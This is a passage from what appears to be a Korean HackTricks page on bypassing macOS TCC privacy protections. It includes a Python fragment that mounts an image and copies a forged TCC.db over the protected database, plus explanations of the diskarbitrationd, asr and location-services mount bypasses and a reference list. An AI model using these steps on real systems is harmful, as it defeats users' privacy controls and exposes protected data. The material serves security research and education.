    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)에서 **full exploit**을 확인하세요.<sup>[[21]](#references)</sup>

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)에서 설명한 것처럼, 이 CVE는 `diskarbitrationd`를 악용했습니다.<sup>[[16]](#references)</sup>

공개 `DiskArbitration` framework의 `DADiskMountWithArgumentsCommon` 함수가 보안 검사를 수행했습니다. 하지만 `diskarbitrationd`를 직접 호출하면 이를 우회할 수 있으므로, 경로에 `../` 요소와 symlink를 사용할 수 있었습니다.

이로 인해 공격자는 `diskarbitrationd`의 `com.apple.private.security.storage-exempt.heritable` entitlement를 이용해 TCC database를 덮어쓰는 경우를 포함하여, 임의의 위치에 mount할 수 있었습니다.

### asr

**`/usr/sbin/asr`** 도구를 사용하면 TCC 보호를 우회해 전체 디스크를 복사하고 다른 위치에 mount할 수 있었습니다.

### CVE-2022-22655 - 위치 서비스

위치 서비스는 다른 서비스처럼 TCC database에 저장되지 않습니다. `locationd`가 관리하며, 자체 allow-list를 **`/var/db/locationd/clients.plist`**에 보관합니다:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

각 항목은 client(bundle ID 또는 executable path)를 키로 하며 `Authorized`, `BundleId`, `Executable`, `Registered` 등의 필드를 포함합니다.<sup>[[4]](#references)</sup>

`clients.plist` 파일 자체는 Sandbox/TCC로 보호되므로 root 권한으로도 수정할 수 없습니다. 하지만 **`/var/db/locationd/` 디렉터리는 mount로부터 보호되지 않았습니다**. 따라서 root로 실행 중인 공격자는 자체 `clients.plist`(자신의 binary가 `Authorized`로 표시된 파일)를 포함하는 disk image를 만들고, 이를 디렉터리에 mount한 다음 `locationd`를 재시작해 위조된 allow-list를 적용할 수 있었습니다.<sup>[[3]](#references)</sup>

> [!TIP]
> 이는 위의 `hdiutil`/`mount` TCC bypass와 같은 패턴입니다. *파일*은 보호되지만 파일이 들어 있는 *디렉터리*는 보호되지 않으므로, 파일 대신 디렉터리 전체를 교체합니다.

## Startup 앱을 통한 방법


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep을 통한 방법

여러 경우에 파일은 이메일 주소, 전화번호, 메시지 등의 민감한 정보를 보호되지 않는 위치에 저장합니다. (이는 Apple의 취약점으로 간주됩니다.)

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

이 방법은 더 이상 작동하지 않지만, [**과거에는 작동했습니다**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)를 사용하는 또 다른 방법:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework 우회](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [실수와 의도에 의한 macOS TCC 사용자 개인정보 보호 기능 우회](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services 우회 (최초 보고서)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [카르멘 샌디에고는 대체 어디에: macOS에서 Location Services 악용하기](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass로 iCloud 데이터 탈취](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG 환경 변수)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - DYLD 환경 변수 허용 entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - 공증: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malware에서 발견된 zero-day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Mac에서 일어난 일은 Apple의 iCloud에 남는다?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [새로운 macOS 취약점 "powerdir", 무단 사용자 데이터 접근으로 이어질 수 있어](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [홈 디렉터리를 변경해 TCC 우회하기, 일명 CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [음악을 재생해 TCC 우회하기, 일명 CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [여우(Firefox)를 터는 방법](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS에서 Telegram을 이용한 TCC 우회](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple 취약점 파헤치기: diskarbitrationd 및 storagekitd 감사 2부](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks 및 CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X에서 환경 변수 설정하기](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass 및 권한 상승](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC database 위에 mount하여 TCC bypass하기](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [macOS 개인정보 보호 메커니즘을 우회하는 20가지 이상의 방법](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC에 완승 - macOS 개인정보 보호 메커니즘을 우회하는 새로운 방법 20가지 이상](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Spotlight에서 Apple Intelligence까지 — 0day를 악용해 macOS AI를 구동하는 데이터 탈취하기](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
